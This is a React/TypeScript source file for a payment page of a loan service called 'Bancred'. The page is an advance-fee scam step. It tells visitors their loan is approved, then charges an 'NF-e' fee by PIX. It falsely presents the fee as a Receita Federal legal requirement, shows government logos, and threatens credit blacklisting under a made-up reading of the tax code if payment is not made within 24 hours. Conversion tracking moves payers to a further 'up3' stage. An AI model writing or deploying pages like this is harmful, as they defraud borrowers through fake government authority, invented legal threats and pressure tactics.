import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  LoaderCircle,
  ScrollText,
  Hash,
  Sparkles,
  ShieldAlert,
  AlertCircle,
  FileCheck,
  QrCode,
  Copy,
  Check,
  Loader2,
  X,
  Clock,
} from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import receitaLogo from "@/assets/receita-federal-logo.svg";
import govbrLogo from "@/assets/govbr-logo.png";
import { useParadisePix } from "@/hooks/useParadisePix";
import { trackEvent } from "@/lib/tracking";
import { getFunnelCustomer } from "@/lib/customer";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixIcon = ({ size = 20 }: { size?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 315.63 315.63">
    <g transform="translate(-2394 -4352.093)">
      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#32bcad" />
    </g>
  </svg>
);

const Up2 = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();

  const nomeRaw = params.get("nome") || "";
  const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();
  const valorOperacao = Number(params.get("valor") || 5000);
  const valorNFe = 32.9;

  const [showPix, setShowPix] = useState(false);
  const [copied, setCopied] = useState(false);

  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
    trackEvent({
      event: "CompletePayment",
      value: valorNFe,
      currency: "BRL",
      contents: [{ content_id: "nfe", content_name: "NF-e", quantity: 1, price: valorNFe }],
    });
    navigate(`/up3?${params.toString()}`);
  });

  const openPix = async () => {
    setShowPix(true);
    trackEvent({
      event: "InitiateCheckout",
      value: valorNFe,
      currency: "BRL",
      contents: [{ content_id: "nfe", content_name: "NF-e", quantity: 1, price: valorNFe }],
    });
    try {
      await create({
        amountCents: Math.round(valorNFe * 100),
        description: `NF-e Bancred - Emissão obrigatória`,
        stage: "up2",
        customer: getFunnelCustomer(params),
      });
    } catch {
      /* erro tratado pelo hook */
    }
  };

  const closePix = () => {
    setShowPix(false);
    reset();
    setCopied(false);
  };

  const handleCopy = async () => {
    if (!pix?.qr_code) return;
    try {
      await navigator.clipboard.writeText(pix.qr_code);
      setCopied(true);
      setTimeout(() => setCopied(false), 2200);
    } catch {
      /* ignore */
    }
  };

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#FFFBEB",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
        }}
      >
        <img src={logo} alt="Bancred" style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }} />
      </header>

      <main style={{ padding: "18px 14px 28px", maxWidth: 480, margin: "0 auto" }}>
        {/* Aprovado banner */}
        <div
          style={{
            background: "linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)",
            borderWidth: "1px 1px 1px 4px",
            borderStyle: "solid",
            borderColor: "#A7F3D0 #A7F3D0 #A7F3D0 #059669",
            borderRadius: 12,
            padding: "12px 14px",
            marginBottom: 14,
            display: "flex",
            alignItems: "center",
            gap: 10,
          }}
        >
          <LoaderCircle size={20} color="#059669" style={{ flexShrink: 0, animation: "spin 1.5s linear infinite" }} />
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 12.5, fontWeight: 800, color: "#065F46", marginBottom: 2 }}>
              ✅ Empréstimo APROVADO e em processamento
            </div>
            <div style={{ fontSize: 11.5, color: "#047857", lineHeight: 1.4 }}>
              Falta apenas <strong>1 etapa fiscal</strong> para o valor cair na sua conta
            </div>
          </div>
        </div>
        <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>

        {/* NF-e card */}
        <section
          style={{
            background: "#FFFFFF",
            borderWidth: "4px 1px 1px",
            borderStyle: "solid",
            borderColor: "#B45309 #FEF3C7 #FEF3C7",
            borderRadius: 14,
            padding: "18px 18px 16px",
            marginBottom: 14,
            boxShadow: "0 10px 28px rgba(180, 83, 9, 0.08)",
            position: "relative",
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              borderBottom: "1px dashed #FEF3C7",
              paddingBottom: 12,
              marginBottom: 14,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <ScrollText size={18} color="#B45309" />
              <div style={{ fontSize: 11, fontWeight: 800, color: "#78350F", letterSpacing: 0.6, textTransform: "uppercase" }}>
                Exigência Fiscal — Receita Federal
              </div>
            </div>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 4,
                fontSize: 10,
                fontWeight: 700,
                color: "#B45309",
                background: "#FFFBEB",
                border: "1px solid #FEF3C7",
                padding: "4px 8px",
                borderRadius: 6,
              }}
            >
              <Hash size={10} /> 420658-NF
            </div>
          </div>

          <h1 style={{ fontSize: 22, fontWeight: 900, color: "#111827", marginBottom: 8, lineHeight: 1.2 }}>
            {primeiroNome}, seu empréstimo já foi aprovado — falta só a NF-e
          </h1>
          <p style={{ fontSize: 13.5, lineHeight: 1.55, color: "#6B7280", margin: "0 0 14px" }}>
            Operações acima de R$&nbsp;3.000,00 são <strong style={{ color: "#78350F" }}>obrigadas por lei</strong> a emitir Nota Fiscal Eletrônica antes do repasse. Esta exigência é do <strong>Governo Federal</strong> — não é uma cobrança da Bancred.
          </p>

          <div
            style={{
              background: "#FFFBEB",
              border: "1px solid #FEF3C7",
              borderRadius: 10,
              padding: "12px 14px",
              display: "grid",
              gap: 8,
            }}
          >
            {[
              { k: "Beneficiário", v: nomeRaw ? nomeRaw.split(" ").slice(0, 2).join(" ") : "Cliente", big: false },
              { k: "Valor da operação", v: formatBRL(valorOperacao), big: true },
              { k: "Natureza", v: "Crédito pessoal", big: false },
            ].map((row) => (
              <div key={row.k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8 }}>
                <span style={{ fontSize: 11.5, color: "#6B7280", textTransform: "uppercase", letterSpacing: 0.5, fontWeight: 600 }}>
                  {row.k}
                </span>
                <span style={{ fontSize: row.big ? 15 : 13, color: "#111827", fontWeight: row.big ? 900 : 600 }}>
                  {row.v}
                </span>
              </div>
            ))}
          </div>
        </section>

        {/* Steps */}
        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 16,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
            marginBottom: 14,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 14 }}>
            <Sparkles size={16} color="#B45309" />
            <div style={{ fontSize: 14, fontWeight: 800, color: "#111827" }}>
              Após o pagamento da NF-e (em até 5 minutos):
            </div>
          </div>
          {[
            "NF-e emitida automaticamente em seu CPF",
            "Registro confirmado junto à Receita Federal",
            `Crédito de ${formatBRL(valorOperacao)} liberado direto na sua conta`,
          ].map((t, i) => (
            <div key={t} style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: i < 2 ? 10 : 0 }}>
              <span
                style={{
                  flexShrink: 0,
                  width: 22,
                  height: 22,
                  borderRadius: "50%",
                  background: "#B45309",
                  color: "#fff",
                  fontSize: 11,
                  fontWeight: 800,
                  display: "inline-flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                {i + 1}
              </span>
              <div style={{ fontSize: 13, color: "#111827", lineHeight: 1.5, paddingTop: 1 }}>{t}</div>
            </div>
          ))}
        </div>

        {/* Warning */}
        <div
          style={{
            background: "#FEF2F2",
            borderWidth: "1.5px 1.5px 1.5px 4px",
            borderStyle: "solid",
            borderColor: "#FCA5A5 #FCA5A5 #FCA5A5 #DC2626",
            borderRadius: 10,
            padding: 14,
            marginBottom: 14,
            display: "flex",
            gap: 10,
          }}
        >
          <ShieldAlert size={22} color="#DC2626" style={{ flexShrink: 0, marginTop: 1 }} />
          <div style={{ fontSize: 12.5, color: "#7F1D1D", lineHeight: 1.55 }}>
            <div style={{ fontWeight: 900, fontSize: 13, marginBottom: 6, color: "#991B1B", textTransform: "uppercase", letterSpacing: 0.3 }}>
              ⚠️ Atenção: prazo de 24h
            </div>
            O não pagamento da NF-e dentro do prazo resulta em <strong>inscrição automática do CPF nos órgãos de proteção ao crédito (SPC e Serasa)</strong>, conforme o Art. 39 do Código Tributário Nacional. Seu nome ficará <strong>negativado</strong> e o empréstimo aprovado será <strong>cancelado sem possibilidade de reabertura</strong>.
          </div>
        </div>

        {/* Info Bancred não recebe */}
        <div
          style={{
            background: "#FFFBEB",
            borderWidth: "1px 1px 1px 4px",
            borderStyle: "solid",
            borderColor: "#FEF3C7 #FEF3C7 #FEF3C7 #B45309",
            borderRadius: 10,
            padding: "12px 14px",
            marginBottom: 14,
            display: "flex",
            gap: 10,
          }}
        >
          <AlertCircle size={20} color="#B45309" style={{ flexShrink: 0, marginTop: 1 }} />
          <div style={{ fontSize: 12.5, color: "#78350F", lineHeight: 1.55 }}>
            O valor da NF-e é repassado diretamente à Receita Federal. A Bancred <strong>não recebe nada</strong> dessa taxa — é uma exigência exclusiva do Governo.
          </div>
        </div>

        {/* Valor */}
        <div
          style={{
            background: "#FFFFFF",
            border: "1px solid #FEF3C7",
            borderRadius: 14,
            padding: "16px 18px",
            marginBottom: 18,
            position: "relative",
            overflow: "hidden",
          }}
        >
          <div
            style={{
              position: "absolute",
              top: 12,
              right: 12,
              padding: "4px 10px",
              border: "1.5px solid #B45309",
              color: "#B45309",
              borderRadius: 6,
              fontSize: 10,
              fontWeight: 900,
              letterSpacing: 1,
              textTransform: "uppercase",
              transform: "rotate(-6deg)",
              opacity: 0.85,
            }}
          >
            A Pagar
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
            <FileCheck size={16} color="#B45309" />
            <div style={{ fontSize: 12, color: "#6B7280", fontWeight: 600 }}>Taxa de emissão da NF-e</div>
          </div>
          <div style={{ fontSize: 36, fontWeight: 900, color: "#78350F", lineHeight: 1, marginBottom: 6 }}>
            {formatBRL(valorNFe)}
          </div>
          <div style={{ fontSize: 12, color: "#6B7280", lineHeight: 1.5 }}>
            Valor único e final. Sem mensalidades, sem cobranças adicionais.
          </div>
        </div>

        <button
          type="button"
          onClick={openPix}
          style={{
            width: "100%",
            padding: "15px 20px",
            background: "#16A34A",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 16,
            fontWeight: 700,
            letterSpacing: -0.2,
            cursor: "pointer",
            boxShadow: "0 8px 24px rgba(22,163,74,0.25)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 8,
            fontFamily: fontStack,
            minHeight: 52,
          }}
        >
          <PixIcon size={20} /> Emitir NF-e e liberar crédito
        </button>

        <footer style={{ marginTop: 22, textAlign: "center" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 18, marginBottom: 10 }}>
            <img src={receitaLogo} alt="Receita Federal do Brasil" style={{ height: 64, width: "auto", opacity: 0.85, display: "block" }} />
            <div style={{ width: 1, height: 46, background: "#E5E7EB" }} />
            <img src={govbrLogo} alt="gov.br" style={{ height: 32, width: "auto", opacity: 0.9, display: "block" }} />
          </div>
          <div style={{ fontSize: 10.5, lineHeight: 1.5, color: "#6B7280", maxWidth: 320, margin: "0 auto" }}>
            Documento emitido em conformidade com as normas da Receita Federal do Brasil. Operação registrada e auditável.
          </div>
        </footer>
      </main>

      {showPix && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(15,23,42,0.55)",
            backdropFilter: "blur(2px)",
            display: "flex",
            alignItems: "flex-end",
            justifyContent: "center",
            zIndex: 60,
          }}
          onClick={closePix}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: "#fff",
              width: "100%",
              maxWidth: 480,
              borderTopLeftRadius: 22,
              borderTopRightRadius: 22,
              padding: "14px 18px 24px",
              maxHeight: "92dvh",
              overflowY: "auto",
              fontFamily: fontStack,
            }}
          >
            <div style={{ width: 44, height: 4, background: "#E5E7EB", borderRadius: 2, margin: "0 auto 14px" }} />

            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <PixIcon size={22} />
                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar NF-e com PIX</span>
              </div>
              <button
                type="button"
                onClick={closePix}
                aria-label="Fechar"
                style={{ background: "transparent", border: "none", cursor: "pointer", color: "#6B7280" }}
              >
                <X size={22} />
              </button>
            </div>

            <div
              style={{
                background: "#F0FDF4",
                border: "1px solid #DCFCE7",
                borderRadius: 14,
                padding: "12px 14px",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 18,
              }}
            >
              <div>
                <div style={{ fontSize: 12, color: "#15803D", fontWeight: 600 }}>Valor a pagar</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#16A34A", letterSpacing: -0.4 }}>
                  {formatBRL(valorNFe)}
                </div>
              </div>
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 6,
                  background: "#fff",
                  border: "1px solid #DCFCE7",
                  color: "#15803D",
                  fontSize: 12,
                  fontWeight: 600,
                  padding: "6px 10px",
                  borderRadius: 999,
                }}
              >
                <Clock size={12} /> expira em 15min
              </div>
            </div>

            {pixLoading || !pix ? (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                <Loader2 size={42} color="#1C68E3" style={{ animation: "spin 1s linear infinite" }} />
                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>{pixError ? pixError : "Gerando seu código PIX..."}</div>
              </div>
            ) : (
              <>
                <div style={{ fontSize: 13, color: "#374151", lineHeight: 1.6, marginBottom: 14 }}>
                  Abra o app do seu banco e acesse a área PIX.<br />
                  Escolha <strong>Ler QR Code</strong> ou <strong>PIX Copia e Cola</strong>.<br />
                  Confirme o valor e finalize o pagamento.
                </div>

                <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 14, padding: 16, marginBottom: 14 }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#374151", fontSize: 13, fontWeight: 600, marginBottom: 12 }}>
                    <QrCode size={14} /> Escaneie o QR Code
                  </div>
                  <div style={{ display: "flex", justifyContent: "center" }}>
                    <img
                      src={pix.qr_image}
                      alt="QR Code PIX"
                      width={240}
                      height={240}
                      style={{ display: "block", background: "#fff", padding: 8, borderRadius: 8 }}
                    />
                  </div>
                </div>

                <div style={{ fontSize: 13, fontWeight: 600, color: "#111827", marginBottom: 6 }}>Ou use o PIX Copia e Cola:</div>
                <div
                  style={{
                    background: "#F9FAFB",
                    border: "1px solid #E5E7EB",
                    borderRadius: 12,
                    padding: 12,
                    fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace",
                    fontSize: 12,
                    color: "#111827",
                    wordBreak: "break-all",
                    lineHeight: 1.5,
                    marginBottom: 12,
                  }}
                >
                  {pix.qr_code}
                </div>

                <button
                  type="button"
                  onClick={handleCopy}
                  style={{
                    width: "100%",
                    padding: "14px 18px",
                    background: copied ? "#16A34A" : "#1C68E3",
                    color: "#fff",
                    border: "none",
                    borderRadius: 12,
                    fontSize: 15,
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 8,
                    fontFamily: fontStack,
                    minHeight: 50,
                  }}
                >
                  {copied ? <Check size={18} /> : <Copy size={18} />} {copied ? "Copiado!" : "Copiar código PIX"}
                </button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Up2;
